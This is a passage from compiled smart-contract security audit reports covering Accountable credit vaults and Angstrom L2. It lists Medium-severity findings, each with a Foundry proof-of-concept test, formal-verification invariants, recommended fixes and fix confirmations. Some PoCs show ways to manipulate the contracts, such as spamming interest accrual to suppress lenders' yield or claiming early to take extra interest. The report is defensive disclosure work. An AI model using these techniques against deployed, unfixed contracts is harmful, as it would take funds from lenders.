**Linea:** Fixed in commit [c462da0](https://github.com/Consensys/linea-monorepo/pull/2007/commits/c462da0574f4f60667c3c357a2be61443fc0ab7a).

**Cyfrin:** Verified.

\clearpage

## [M-11] `Accountable Fixed Term::claim Interest` unpredictable due to share burn mechanics
- Severity: `Medium`
- Source report: `accountable.md`

### Detailed Content (from source)
**Description:** [`AccountableFixedTerm::claimInterest`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableFixedTerm.sol#L215-L217) lets a lender redeem their share of already-paid interest by burning vault shares and receiving assets. The burn uses a divisor based on the full-term max net return (fixed at loan acceptance), not the interest actually funded so far:

```solidity
uint256 maxNetYield = PRECISION + _interestParams.netReturn;
claimedInterest = shares.mulDiv(claimableInterest, totalShares, Math.Rounding.Floor);
uint256 usedShares = claimedInterest.mulDiv(PRECISION, maxNetYield, Math.Rounding.Ceil);
```

Because `netReturn` is an optimistic, end-of-term figure, early claimers burn fewer shares per unit claimed, shrinking `totalSupply` and making later outcomes order- and timing-dependent. This yields unpredictable per-user results and creates a systematic advantage for early claimers, especially harmful if the loan later underperforms or defaults, where early claims are crystallized at optimistic rates and late claimers eat the shortfall.

If the loan finishes without default and everyone eventually claims, equal-share lenders converge to the same total interest.

**Impact:** * Unpredictable user payouts / MEV: Two equal lenders can claim different amounts purely due to claim order; bots can claim immediately after `pay()` to improve their take.
* Asymmetric default risk: If the loan defaults before maturity, early claimers have already extracted cash flows computed using the potential full-term net return. Late/non-claimers are left with less remaining claimable interest/recovery, creating an unfair “claim early” optimization and worsening losses for cooperative users.
* UX / reputational risk: Users pressing “claim” cannot deterministically know the amount; outcomes can be front-run within the same interval.

**Proof of Concept:** Add the following test to `AccountableFixedTerm.t.sol`:
```solidity
function test_earlyClaimerAdvantage_dueToMaxNetReturnBurn_usdc() public {
    vm.warp(1739893670);

    // Setup borrower/terms identical to other tests
    vm.prank(manager);
    usdcLoan.setPendingBorrower(borrower);

    vm.prank(borrower);
    usdcLoan.acceptBorrowerRole();

    vm.prank(manager);
    usdcLoan.setTerms(
        LoanTerms({
            minDeposit: 0,
            minRedeem: 0,
            maxCapacity: USDC_AMOUNT,
            minCapacity: USDC_AMOUNT / 2,
            interestRate: 1e5,
            interestInterval: 30 days,
            duration: 360 days,
            lateInterestGracePeriod: 2 days,
            depositPeriod: 2 days,
            acceptGracePeriod: 0,
            lateInterestPenalty: 5e2,
            withdrawalPeriod: 0
        })
    );

    // Equal deposits for Alice & Bob
    uint256 userDeposit = USDC_AMOUNT / 2;

    uint256 aliceBalanceBefore = usdc.balanceOf(alice);
    uint256 bobBalanceBefore   = usdc.balanceOf(bob);

    vm.prank(alice);
    usdcVault.deposit(userDeposit, alice, alice);

    vm.prank(bob);
    usdcVault.deposit(userDeposit, bob, bob);

    // Sanity: equal initial shares
    assertEq(usdcVault.balanceOf(alice), userDeposit, "alice initial shares");
    assertEq(usdcVault.balanceOf(bob),   userDeposit, "bob initial shares");

    // Accept loan
    vm.warp(block.timestamp + 3 days);
    vm.prank(borrower);
    usdcLoan.acceptLoanLocked();

    // Fund borrower to pay interest and approve
    usdc.mint(borrower, 2_000_000e6);
    vm.prank(borrower);
    usdc.approve(address(usdcLoan), 2_000_000e6);

    uint256 aliceMidClaim;
    uint256 aliceEndClaim;
    uint256 bobEndClaim;

    // Pay month by month; Alice claims once in the middle, Bob waits
    for (uint8 i = 1; i <= 12; i++) {
        uint256 nextDueDate = usdcLoan.loan().startTime + (i * usdcLoan.loan().interestInterval);
        vm.warp(nextDueDate + 1 days);

        // Borrower pays owed interest for this interval
        vm.startPrank(borrower);
        uint256 owed = _interestOwed(usdcLoan);
        usdcLoan.pay(owed);
        vm.stopPrank();

        // Alice claims right after month 6 payment
        if (i == 6) {
            vm.prank(alice);
            aliceMidClaim = usdcLoan.claimInterest();
            assertGt(aliceMidClaim, 0, "alice mid-term claim > 0");
        }
    }

    // After last payment, both can claim
    vm.prank(alice);
    aliceEndClaim += usdcLoan.claimInterest();

    vm.prank(bob);
    bobEndClaim += usdcLoan.claimInterest();

    uint256 aliceTotal = aliceMidClaim + aliceEndClaim;
    uint256 bobTotal   = bobEndClaim;

    // Alice has gotten more than Bob by claiming early
    assertGt(aliceTotal, bobTotal, "Alice (mid+end) should claim more than Bob (end only)");

    // repay & clean-up
    vm.prank(borrower);
    usdcLoan.repay(0);

    // Ensure both still redeem principal back pro-rata after interest claims
    uint256 sharesAlice = usdcVault.balanceOf(alice);
    uint256 sharesBob   = usdcVault.balanceOf(bob);

    vm.prank(alice);
    usdcVault.requestRedeem(sharesAlice, alice, alice);
    vm.prank(bob);
    usdcVault.requestRedeem(sharesBob, bob, bob);

    vm.startPrank(alice);
    uint256 maxWithdrawAlice = usdcVault.maxWithdraw(alice);
    usdcVault.withdraw(maxWithdrawAlice, alice, alice);
    vm.stopPrank();

    vm.startPrank(bob);
    uint256 maxWithdrawBob = usdcVault.maxWithdraw(bob);
    usdcVault.withdraw(maxWithdrawBob, bob, bob);
    vm.stopPrank();

    assertEq(usdcVault.balanceOf(alice), 0, "alice no shares");
    assertEq(usdcVault.balanceOf(bob),   0, "bob no shares");

    uint256 aliceBalanceAfter  = usdc.balanceOf(alice);
    uint256 bobBalanceAfter    = usdc.balanceOf(bob);

    uint256 aliceGain = aliceBalanceAfter - aliceBalanceBefore;
    uint256 bobGain   = bobBalanceAfter   - bobBalanceBefore;

    // Alice and Bob has gained the same in the end
    assertEq(aliceGain, bobGain, "alice and bob gained the same");
}
```

**Recommended Mitigation:** Consider replacing the share-burn with an accumulator (“rewards-per-share”) model: Maintain a high-precision `accInterestPerShare` that increases only when real net interest is paid (after fees) by `netInterest / totalShares`; each lender tracks a checkpoint of this accumulator, and on claim receives `(accCurrent − checkpoint) × shares`, then updates their checkpoint.
If transfers/mints/burns were ever allowed mid-loan, first settle pending interest for the party(ies) at the current accumulator and then adjust checkpoints:
```solidity
uint256 accInterestPerShare;
mapping(address user => uint256 index) userIndex;
mapping(address user => uint256 interest) pendingInterest;

function onTransfer(address from, address to, uint256 amount) external onlyVault nonReentrant {

    // Settle sender’s pending interest (if not mint)
    if (from != address(0)) {
        _settleAccount(from);
        userIndex[from] = accInterestPerShare;
    }

    // Settle receiver’s pending interest (if not burn)
    if (to != address(0)) {
        _settleAccount(to);
        userIndex[to] = accInterestPerShare;
    }

}

/// Internal: settle one account’s pending interest using current accumulator
function _settleAccount(address user) internal {
    uint256 shares = vault.balanceOf(user);
    uint256 idx = userIndex[user];

    if (shares == 0) {
        userIndex[user] = accInterestPerShare;
        return;
    }

    uint256 delta  = accInterestPerShare - idx;
    if (delta == 0) return;

    pendingInterest[user] += (shares * delta) / PRECISION;
    userIndex[user] = accInterestPerShare;
}
```

This makes payouts deterministic and call-order independent, distributes only actually received interest (so no “pre-claiming” future yield), and remains fair under partial payments or defaults while preserving price invariance without burning.

**Accountable:** Fixed in commits [`19a50c8`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/19a50c8e1275545ae3e461233f4699cb681ec731) and [`fd74c1d`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/fd74c1d62d4b1ae8cac03f501fd398e1a6854545)

**Cyfrin:** Verified. An interest accrual system is used and the vault now calls an `onTransfer`-hook on the strategy for transfers.

## [M-12] Consider consistently use `Ownable2Step`
- Severity: `Medium`
- Source report: `accountable.md`

### Detailed Content (from source)
**Description:** Currently some contracts use just Ownable, consider have all contracts use Ownable2Step to prevent accidental ownership loss.


**Accontable:**
Fixed in commit [`be75091`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/be7509165d468fd19bf48bab3fa87e565412a5b6)

**Cyfrin:** Verified.

## [M-13] Frequent `Accountable Open Term::accrue Interest` calls reduce interest accrual
- Severity: `Medium`
- Source report: `accountable.md`

### Detailed Content (from source)
**Description:** In [`AccountableOpenTerm::_linearInterest`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableOpenTerm.sol#L602-L604), interest accrual uses integer math, `_linearInterest(rate, dt) = rate * dt / DAYS_360_SECONDS`:
```solidity
function _linearInterest(uint256 interestRate, uint256 timeDelta) internal pure returns (uint256) {
    return interestRate.mulDiv(timeDelta, DAYS_360_SECONDS);
}
```

For small `timeDelta`, this often rounds to zero. Yet `accrueInterest()` still sets `_accruedAt = block.timestamp` even when the computed increment is zero. Repeated calls with short intervals therefore discard elapsed time in many zero-increment slices, producing a persistently lower `_scaleFactor` than a single accrual over the same wall-clock period.

For example, for a 15% APY (150_000) you would have to call once every 207 seconds (~4 minutes):
```
360 days / 150_000 = 31104000 / 150_000 = 207
```

**Impact:** Any actor can repeatedly call `accrueInterest()` at short intervals to suppress interest growth. Over time this materially underpays LPs (lower share price / fewer assets owed by the borrower) and reduces protocol fee bases tied to interest. The effect compounds with call cadence and APR, creating measurable loss without needing privileged access.

**Proof of Concept:** Add the following test to `AccountableOpenTerm.t.sol`:
```solidity
function test_interest_rounding_from_frequent_accrue_calls() public {
    vm.warp(1739893670);

    vm.prank(manager);
    usdcLoan.setPendingBorrower(borrower);
    vm.prank(borrower);
    usdcLoan.acceptBorrowerRole();

    // Use a common APR (15%) and short interval; depositPeriod = 0 to keep price logic simple.
    LoanTerms memory terms = LoanTerms({
        minDeposit: 0,
        minRedeem: 0,
        maxCapacity: USDC_AMOUNT,
        minCapacity: USDC_AMOUNT / 2,
        interestRate: 150_000,        // 15% APR in bps units
        interestInterval: 30 days,
        duration: 0,
        depositPeriod: 0,
        acceptGracePeriod: 0,
        lateInterestGracePeriod: 0,
        lateInterestPenalty: 0,
        withdrawalPeriod: 0
    });
    vm.prank(manager);
    usdcLoan.setTerms(terms);
    vm.prank(borrower);
    usdcLoan.acceptTerms();

    // Provide principal so interest accrues on outstanding assets.
    vm.prank(alice);
    usdcVault.deposit(USDC_AMOUNT, alice, alice);

    // Snapshot the baseline state just after start.
    uint256 snap = vm.snapshot();

    // ------------------------------------------------------------
    // Scenario A: "Spam accrual" — call accrueInterest() every 12s for 1 hour.
    // Each 12s step yields baseRate = rate * 12 / 360d ≈ 0 (integer), but _accruedAt is reset,
    // so we lose that fractional time forever.
    // ------------------------------------------------------------
    uint256 step = 180;          // 3 minutes
    uint256 total = 3600;        // 1 hour
    uint256 n = total / step;    // 300 iterations

    for (uint256 i = 0; i < n; i++) {
        vm.warp(block.timestamp + step);
        usdcLoan.accrueInterest(); // returns new scale but we just trigger the reset
    }

    // Capture the resulting scale factor after the spammy accrual pattern
    uint256 sfSpam = usdcLoan.accrueInterest(); // one more call just to read the value

    // ------------------------------------------------------------
    // Scenario B: Single accrual after the same total wall-clock time.
    // ------------------------------------------------------------
    vm.revertTo(snap);
    vm.warp(block.timestamp + total);
    uint256 sfClean = usdcLoan.accrueInterest();

    // Expect the spammed path to have strictly lower scale factor than the clean path.
    assertLt(sfSpam, sfClean, "frequent zero-delta accrual bleeds interest vs single accrual");

    // Anything more often than 207 in this case will result in no interest growth at all.
    assertEq(sfSpam, 1e36, "frequent accruals yield no interest growth");
}
```

**Recommended Mitigation:** Consider using higher precision to track interest rate. For example, 1e18 or 1e36.

**Accountable:** Fixed in commit [`29c3f72`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/29c3f72ddcb73474918dc3e74a52a2dd3c247bb5)

**Cyfrin:** Verified. `_linearInterest` now scales with `PRECISION`.

## [M-15] Manual/Instant `fulfill Redeem Request` doesn’t reserve liquidity
- Severity: `Medium`
- Source report: `accountable.md`

### Detailed Content (from source)
**Description:** `AccountableAsyncRedeemVault` account for reserved liquidity only when processing the queue through (`AccountableWithdrawalQueue::processUpToShares` / `AccountableWithdrawalQueue::processUpToRequestId`).
However, the manual fulfillment paths (`fulfillRedeemRequest`) and the instant branch of `requestRedeem` mark shares as claimable without increasing `reservedLiquidity`.

When these paths are mixed, multiple fulfillments can each pass the “liquidity” check independently (because nothing was reserved by earlier fulfills), producing a state where:

```
sum(claimable assets across users)  >  vault.totalAssets() - reservedLiquidity
```

Potentially causing claimable assets to be larger than the available liquidity.

**Impact:** The vault can end up with more claimable redemptions than available assets, causing later withdrawals to revert (depending on integration logic), and creating fairness and accounting issues between users.

**Proof of Concept:** Add the following test to `AccountableWithdrawalQueue.t.sol`:
```solidity
function test_manualFulfill_vsQueuedFulfill_mismatch() public {
    // Setup: price = 1e36, deposits for Alice & Bob
    _setupInitialDeposits(1e36, DEPOSIT_AMOUNT);

    uint256 aliceHalf = vault.balanceOf(alice) / 2;
    uint256 bobHalf   = vault.balanceOf(bob)   / 2;

    // === (A) Queue Bob first and reserve via processor ===
    vm.prank(bob);
    uint256 bobReqId = vault.requestRedeem(bobHalf, bob, bob);
    assertEq(bobReqId, 1, "Bob should be the head of the queue");

    // Processor path reserves liquidity for Bob
    uint256 price = strategy.sharePrice(address(vault)); // 1e36
    uint256 expectedBobAssets = (bobHalf * price) / 1e36;
    uint256 used = vault.processUpToShares(bobHalf);
    assertEq(used, expectedBobAssets, "queued fulfill reserves exact assets for Bob");

    // Sanity: reservedLiquidity == Bob's claimable assets
    uint256 reservedBefore = vault.reservedLiquidity();
    assertEq(reservedBefore, expectedBobAssets, "only Bob's queued path bumped reservedLiquidity");

    // === (B) Now manually fulfill Alice (no reservation bump) ===
    vm.prank(alice);
    uint256 aliceReqId = vault.requestRedeem(aliceHalf, alice, alice);
    assertEq(aliceReqId, 2, "Alice should be behind Bob in the queue");

    // Manual fulfill creates claimables but doesn't increase reservedLiquidity
    strategy.fulfillRedeemRequest(0, address(vault), alice, aliceHalf);

    // Compute claimables in assets
    uint256 aliceClaimableShares = vault.claimableRedeemRequest(0, alice);
    uint256 bobClaimableShares   = vault.claimableRedeemRequest(0, bob);
    assertEq(aliceClaimableShares, aliceHalf, "Alice claimable shares set by manual fulfill");
    assertEq(bobClaimableShares,   bobHalf,   "Bob claimable shares set by queued processor");

    uint256 aliceClaimableAssets = (aliceClaimableShares * price) / 1e36;
    uint256 bobClaimableAssets   = (bobClaimableShares   * price) / 1e36;
    uint256 totalClaimables      = aliceClaimableAssets + bobClaimableAssets;

    // Mismatch: claimables exceed reservedLiquidity because Alice's path didn't reserve
    assertGt(totalClaimables, reservedBefore, "claimables > reservedLiquidity (oversubscription)");

    // === (C) Bob withdraws his reserved claim → consumes all reservation ===
    uint256 bobMax = vault.maxWithdraw(bob);
    assertEq(bobMax, bobClaimableAssets, "Bob can withdraw exactly his reserved amount");

    uint256 vaultAssetsBefore = vault.totalAssets();
    vm.prank(bob);
    vault.withdraw(bobMax, bob, bob);

    // After paying Bob, reservation is zero, but Alice still has claimables (unreserved)
    uint256 reservedAfter = vault.reservedLiquidity();
    assertEq(reservedAfter, 0, "all reserved liquidity consumed by Bob's withdrawal");

    uint256 aliceClaimableShares2 = vault.claimableRedeemRequest(0, alice);
    uint256 aliceClaimableAssets2 = (aliceClaimableShares2 * price) / 1e36;
    assertEq(aliceClaimableShares2, aliceHalf, "Alice still has claimables (manual path)");
    assertGt(aliceClaimableAssets2, reservedAfter, "manual claimables remain with zero reservation");

    // Optional sanity: vault asset balance decreased by Bob's withdrawal only
    uint256 vaultAssetsAfter = vault.totalAssets();
    assertEq(vaultAssetsBefore - vaultAssetsAfter, bobMax, "vault paid only the reserved portion");
}
```

**Recommended Mitigation:** Consider making `_fulfillRedeemRequest` the single source of truth for reservation accounting:

1. Move`reservedLiquidity` bump into `_fulfillRedeemRequest`.
2. Remove `reservedLiquidity` increments from `processUpToShares` / `processUpToRequestId` (to avoid double counting).

**Accountable:** Fixed in commit [`c3a7cbf`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/c3a7cbf0275a758a5d816c9f3298bc95d788db4f)

**Cyfrin:** Verified. Recommended mitigation implemented. `reservedLiquidity` is tracked in `_fulfillRedeemRequest` and removed form the "process" functions.

## [M-16] Missing controller validation in `Accountable Async Redeem Vault::request Redeem` allows zero address state
- Severity: `Medium`
- Source report: `accountable.md`

### Detailed Content (from source)
**Description:** The `requestRedeem()` function fails to call `_checkController(controller)` validation, allowing the zero address to accumulate vault state.

**Impact:** `zeroControllerEmptyState` violation.

**Proof of Concept:** ❌ Violated: https://prover.certora.com/output/52567/acc42433123e4b289c0f84e69fa52a44/?anonymousKey=e60b3d66b5574868073bfde4218b385aa2fe5f2a

```solidity
// Zero address must have empty state for all vault fields
invariant zeroControllerEmptyState(env e)
    ghostVaultStatesMaxMint256[0] == 0 &&
    ghostVaultStatesMaxWithdraw256[0] == 0 &&
    ghostVaultStatesDepositAssets256[0] == 0 &&
    ghostVaultStatesRedeemShares256[0] == 0 &&
    ghostVaultStatesDepositPrice256[0] == 0 &&
    ghostVaultStatesMintPrice256[0] == 0 &&
    ghostVaultStatesRedeemPrice256[0] == 0 &&
    ghostVaultStatesWithdrawPrice256[0] == 0 &&
    ghostVaultStatesPendingDepositRequest256[0] == 0 &&
    ghostVaultStatesPendingRedeemRequest256[0] == 0 &&
    ghostVaultStatesClaimableCancelDepositRequest256[0] == 0 &&
    ghostVaultStatesClaimableCancelRedeemRequest256[0] == 0 &&
    !ghostVaultStatesPendingCancelDepositRequest[0] &&
    !ghostVaultStatesPendingCancelRedeemRequest[0] &&
    ghostRequestIds128[0] == 0
filtered { f -> !EXCLUDED_FUNCTION(f) } { preserved with (env eFunc) { SETUP(e, eFunc); } }
```

✅ Verified after the fix: https://prover.certora.com/output/52567/f385fd34e82c4635bd410279e4da2c97/?anonymousKey=82309551a07845692bfabb2164179224523f87ba

**Recommended Mitigation:**
```diff
diff --git a/credit-vaults-internal/src/vault/AccountableAsyncRedeemVault.sol b/credit-vaults-internal/src/vault/AccountableAsyncRedeemVault.sol
index 4cd0a3e..a64f47c 100644
--- a/credit-vaults-internal/src/vault/AccountableAsyncRedeemVault.sol
+++ b/credit-vaults-internal/src/vault/AccountableAsyncRedeemVault.sol
@@ -113,6 +113,9 @@ contract AccountableAsyncRedeemVault is IAccountableAsyncRedeemVault, Accountabl
         onlyAuth
         returns (uint256 requestId)
     {
+        // @certora FIX for zeroControllerEmptyState
+        _checkController(controller);
+
         _checkOperator(owner);
         _checkShares(owner, shares);
```

**Accountable:** Fixed in commit [`e90d3de`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/e90d3de5c133c73f0e783d552bb4e256400a547c)

**Cyfrin:** Verified. `checkController` added as a modifier to the function.

## [M-17] Reserved assets could be extracted from the Vault
- Severity: `Medium`
- Source report: `accountable.md`

### Detailed Content (from source)
**Description:** Some strategy functions can release assets without checking if those assets are part of `reservedLiquidity`. `AccountableFixedTerm._loan.drawableFunds` is not verified to be in sync with the queue `reservedLiquidity`. Hence the borrower can inadvertently borrow more funds than they should.

**Impact:** The vault can become insolvent by releasing funds needed to honor a withdrawal.

**Proof of Concept:** Violated in `FixedTerm.acceptLoanLocked(), FixedTerm.borrow(), FixedTerm.pay(), FixedTerm.acceptLoanDynamic(), FixedTerm.claimInterest()`: https://prover.certora.com/output/52567/edb399a43d1849a9b22f027e66b17924/?anonymousKey=3dcf62dfa004381083966b3639b6a485fa2e9501

```solidity
// Reserved liquidity must not exceed total assets
invariant reservedLiquidityBacked(env e)
    ghostReservedLiquidity256 <= ghostTotalAssets256
```

**Recommended Mitigation:** When `reservedLiquidity` is increased in the withdrawal queue, this needs to be synced to the FixedTerm starategy.

**Accountable:** Fixed in commit [`979c0e`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/979c0ebe4bd5860fe9b2e446f9fac2ae3919b39c).

Issue was addressed to satisfy the invariant and prevent future upgrades that might allow redemptions in a FixedTerm loan, but as of right now there's no possible way to increase `reservedLiquidity` such that it is out-of-sync with`drawableFunds`.

Borrowing after the loan is in a `Repaid` state cannot happen due to `_requireLoanOngoing` so any redemptions that increase `reservedLiquidity` would require a state when both depositing/borrowing is blocked.

**Cyfrin:** Verified. `reservedLiquidity` is now checked in FixedTerm.

## [M-18] Storage read optimizations
- Severity: `Medium`
- Source report: `accountable.md`

### Detailed Content (from source)
**Description:**
1. [`AccountableOpenTerm::_calculateRequiredLiquidity`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableOpenTerm.sol#L642-L655): `vault` and `_scaleFactor` can be cached. Also consider changing so that `_calculateRequiredLiquidity` takes `address vault_` as a parameter. That would allow to cache the   `vault` read in the [`_isDelinquent`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableOpenTerm.sol#L492-L497), [`_getAvailableLiquidity`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableOpenTerm.sol#L658-L663), [`_borrowable`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableOpenTerm.sol#L518-L523) and [`_validateLiquidityForTermChange`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableOpenTerm.sol#L526-L533) flows as well.

2. [`AccountableOpenTerm::_getAvailableLiquidityForProcessing`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableOpenTerm.sol#L666-L671): `vault` can be cached. Also consider same as above, add `address vault_` as a parameter, then use a cached value from [`_processAvailableWithdrawals`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableOpenTerm.sol#L536-L570).

3. [`AccountableOpenTerm::_penaltyFee`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableOpenTerm.sol#L587-L599), use the cached value `gracePeriod` on [L595](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableOpenTerm.sol#L595)

4. [`AccountableOpenTerm::supply`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableOpenTerm.sol#L238-L244): `vault` can be cached

5. [`AccountableOpenTerm::repay`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableOpenTerm.sol#L260-L272): `vault` can be cached.

6. [`AccountableFixedTerm::_sharePrice`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableFixedTerm.sol#L533-L540): `loanState` can be cached.

7. [`AccountableStrategy::acceptBorrowerRole`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableStrategy.sol#L181-L189): Use `msg.sender` instead of `pendingBorrower` on [L185](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableStrategy.sol#L185) and instead of `borrower` on [L188](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableStrategy.sol#L188)

8. [`AccountableStrategy::_requireLoanNotOngoing`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableStrategy.sol#L474-L476): `loanState` can be cached.

9. [`AccountableStrategy::_requireLoanOngoing`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableStrategy.sol#L479-L481): `loanState` can be cached.

10. [AccountableWithdrawalQueue::_push](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/vault/queue/AccountableWithdrawalQueue.sol#L82-L84): Set `_queue.nextRequestId` to `1` at construction and remove the if to save a read each `_push`.

11. [`AccountableAsyncRedeemVault::redeem`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/vault/AccountableAsyncRedeemVault.sol#L155-L156): `state.redeemPrice` can be cached

12. [`AccountableAsyncRedeemVault::withdraw`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/vault/AccountableAsyncRedeemVault.sol#L176-L177): `state.withdrawPrice` can be cached.

13. [`AccountableAsyncRedeemVault::_updateRedeemState`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/vault/AccountableAsyncRedeemVault.sol#L197-L201): `state.maxWithdraw` and `state.redeemShares` can be cached.

14. [`AccountableAsyncRedeemVault::_fulfillRedeemRequest`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/vault/AccountableAsyncRedeemVault.sol#L305-L326): `state.pendingRedeemRequest`, `state.maxWithdraw` and `state.redeemShares` can be cached.

15. [`AccountableAsyncRedeemVault::maxRedeem`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/vault/AccountableAsyncRedeemVault.sol#L352-L356) and [AccountableAsyncRedeemVault::maxWithdraw](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/vault/AccountableAsyncRedeemVault.sol#L359-L363): Can be rewritten as:
    ```solidity
    function maxWithdraw(address receiver) public view override returns (uint256 maxAssets) {
        VaultState storage state = _vaultStates[receiver];
        maxAssets = state.maxWithdraw;
        if (state.redeemShares == 0) return 0;
    }
    ```

16. [`Authorizable::_verify`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/access/Authorizable.sol#L47-L75): `signer` can be cached.

17. [`RewardsDistributorMerkle::acceptRoot`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/rewards/RewardsDistributorMerkle.sol#L67-L68): `_pendingRoot.validAt` can be cached.

18. [`RewardsDistributorMerkle::claim`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/rewards/RewardsDistributorMerkle.sol#L100-L102): `claimed[account][asset])` can be cached

19. [`RewardsDistributorStrategy::claim`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/rewards/RewardsDistributorStrategy.sol#L40-L42): `claimed[account][asset])` can be cached


**Accountable:** Most fixed in commit [`8e1cfa2`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/8e1cfa29de4dc4b0198e26e59acb56e7c929dbcf)

**Cyfrin:** Verified.

\clearpage

## [M-19] Upgradeable contracts which are inherited from should use ERC7201 namespaced storage layouts or storage gaps to prevent storage collisions
- Severity: `Medium`
- Source report: `accountable.md`

### Detailed Content (from source)
**Description:** The protocol has upgradeable contracts which other contracts inherit from. These contracts should either use:
* [ERC7201](https://eips.ethereum.org/EIPS/eip-7201) namespaced storage layouts - [example](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/access/AccessControlUpgradeable.sol#L60-L72)
* storage gaps (though this is an [older and no longer preferred](https://blog.openzeppelin.com/introducing-openzeppelin-contracts-5.0#Namespaced) method)

The ideal mitigation is that all upgradeable contracts use ERC7201 namespaced storage layouts.

Without using one of the above two techniques storage collision can occur during upgrades.

**Accountable:** Fixed in commit [`8422762`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/842276202616ce58cdf7d766c2792fc3752157ba)

**Cyfrin:** Verified. Namespaced storage now used in `AccountableStrategy`.

## [M-20] `IBefore Initialize Hook` should be added to the `Angstrom L2` inheritance chain
- Severity: `Medium`
- Source report: `angstrom.md`

### Detailed Content (from source)
**Description:** `AngstromL2.sol` imports the `IBeforeInitializeHook` interface; however, it is not currently used. Given that `AngstromL2` is expected to implement this hook, it should be added to the inheritance chain:

```diff
contract AngstromL2 is
    UniConsumer,
    Ownable,
+   IBeforeInitializeHook
    IBeforeSwapHook,
    IAfterSwapHook,
    IAfterAddLiquidityHook,
    IAfterRemoveLiquidityHook
{
    ...
}
```

**Sorella Labs:** Fixed in commit [724759d](https://github.com/SorellaLabs/l2-angstrom/commit/724759d9f673cda2b48565b00052bb541349cfa0).

**Cyfrin:** Verified.

## [M-21] Consider burning `ERC-6909` claim tokens within `Angstrom L2::withdraw Protocol Revenue` and transferring the underlying asset instead
- Severity: `Medium`
- Source report: `angstrom.md`

### Detailed Content (from source)
**Description:** `AngstromL2::withdrawProtocolRevenue` currently transfers `ERC-6909` balance to the recipient; however, this address may lack the capability to easily burn the claim token. Instead, it may be preferable to perform this step within a Uniswap V4 `PoolManager` callback prior to transferring the underlying asset and then ending execution.

```solidity
UNI_V4.transfer(to, assetId, amount);
```

**Sorella Labs:** Fixed in commit [ffb9fb2](https://github.com/SorellaLabs/l2-angstrom/commit/ffb9fb20e5b0afbf6996ef9528ef10acd8c94f91#diff-0e68badc81333f3e60fad8069459c6e57e1ac84f433fb40f23cda776b9f9442b).

**Cyfrin:** Verified. The underlying currency is now transferred directly.

## [M-22] Unnecessary arithmetic validation within `Angstrom L2::withdraw Protocol Revenue` can be removed
- Severity: `Medium`
- Source report: `angstrom.md`

### Detailed Content (from source)
